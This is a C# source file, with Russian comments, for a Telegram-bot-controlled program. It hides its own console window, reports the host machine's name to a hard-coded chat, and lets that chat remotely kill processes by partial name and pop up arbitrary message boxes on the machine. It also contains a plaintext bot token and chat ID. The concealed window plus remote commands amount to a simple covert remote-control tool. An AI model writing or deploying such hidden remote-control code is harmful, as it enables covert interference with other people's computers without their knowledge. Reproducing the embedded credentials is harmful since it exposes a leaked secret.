using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using System.Drawing;
using System.Windows.Forms;
using System.Windows;
using MessageBox = System.Windows.Forms.MessageBox;

namespace TgBot
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            string currentComputerName = Environment.MachineName.ToLower();
            var client = new TelegramBotClient("5376040452:AAH7vnSweprjjIhWNQouiYAk40UvGBTb58o");

            // Отправляем сообщение о запуске на конкретном ПК
            client.SendTextMessageAsync("455077378", $"Бот запущен на ПК {currentComputerName}.");

            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE);

            client.StartReceiving(Update, Error);
            Console.ReadLine();
        }

        async static Task Error(ITelegramBotClient botClient, Exception update, CancellationToken token)
        {
            return;
        }

        async static Task Update(ITelegramBotClient botClient, Update update, CancellationToken token)
        {
            var message = update.Message;
            if (message.Text != null)
            {
                if (message.Chat.Id != 455077378)
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Нет.");
                }
                else
                {
                    // Закрытие всякого
                    if (message.Text.ToLower().StartsWith("/getdown "))
                    {
                        string commandText = message.Text.Substring("/getdown ".Length);
                        string[] commandParts = commandText.Split('|');

                        if (commandParts.Length != 2)
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Команда должна иметь формат /getdown <часть имени процесса> | <имя компьютера>.");
                            return;
                        }

                        string partialProcessName = commandParts[0].Trim();
                        string computerName = commandParts[1].Trim();
                        string currentComputerName = Environment.MachineName.ToLower();

                        if (computerName.ToLower() == currentComputerName.ToLower())
                        {
                            Process[] allProcesses = Process.GetProcesses();

                            bool processFound = false;
                            bool computerFound = true;

                            foreach (Process process in allProcesses)
                            {
                                string processName = process.ProcessName.ToLower();

                                if (processName.Contains(partialProcessName))
                                {
                                    process.Kill();
                                    await botClient.SendTextMessageAsync(message.Chat.Id, $"Процесс {process.ProcessName} на компьютере {currentComputerName} успешно закрыт.");
                                    processFound = true;
                                }
                            }

                            if (!processFound)
                            {
                                await botClient.SendTextMessageAsync(message.Chat.Id, $"Процессы с частью имени {partialProcessName} на компьютере {currentComputerName} не найдены.");
                            }
                            if (!computerFound)
                            {
                                await botClient.SendTextMessageAsync(message.Chat.Id, "Компьютер не найден.");
                                return;
                            }
                        }  
                    }

                    // Сообщения
                    if (message.Text.StartsWith("/message "))
                    {
                        string currentComputerName = Environment.MachineName.ToLower();
                        string commandText = message.Text.Substring("/message ".Length);
                        string[] parts = commandText.Split('|');

                        if (parts.Length < 2)
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Команда должна иметь формат /message <текст> | <заголовок>.");
                            return;
                        }

                        string messageText = parts[0].Trim();
                        string windowTitle = parts[1].Trim();

                        if (string.IsNullOrWhiteSpace(messageText) || string.IsNullOrWhiteSpace(windowTitle))
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Текст сообщения и название окна не могут быть пустыми.");
                            return;
                        }
                        MessageBox.Show(messageText, windowTitle);
                        await botClient.SendTextMessageAsync(message.Chat.Id, $"Сообщение с заголовком: {windowTitle} и текстом {messageText} было отправлено на компьютер {currentComputerName}.");
                    }
                }
            }
            else
            {
                return;
            }
        }
    }
}